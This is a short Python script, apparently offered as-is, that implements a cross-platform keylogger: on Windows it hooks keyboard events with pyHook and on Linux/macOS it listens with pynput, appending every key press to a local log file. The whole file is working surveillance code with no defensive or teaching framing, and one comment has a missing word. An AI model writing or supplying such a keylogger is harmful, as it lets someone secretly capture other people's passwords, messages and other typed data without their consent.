import os
import time

def start_keylogger(log_file_path):
    if os.name == 'nt':
        # Implement Windows keylogger logic
        import pyHook, pythoncom

        def OnKeyboardEvent(event):
            with open(log_file_path, 'a') as f:
                f.write(chr(event.Ascii))
            return True

        hm = pyHook.HookManager()
        hm.KeyDown = OnKeyboardEvent
        hm.HookKeyboard()
        pythoncom.PumpMessages()
    elif os.name == 'posix':
        # Implement Linux/MacOS keylogger logic
        # Example: Using  library
        from pynput import keyboard

        def on_press(key):
            with open(log_file_path, 'a') as f:
                f.write(str(key) + '\n')

        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

if __name__ == "__main__":
    log_file_path = "/path/to/log_file"
    start_keylogger(log_file_path)
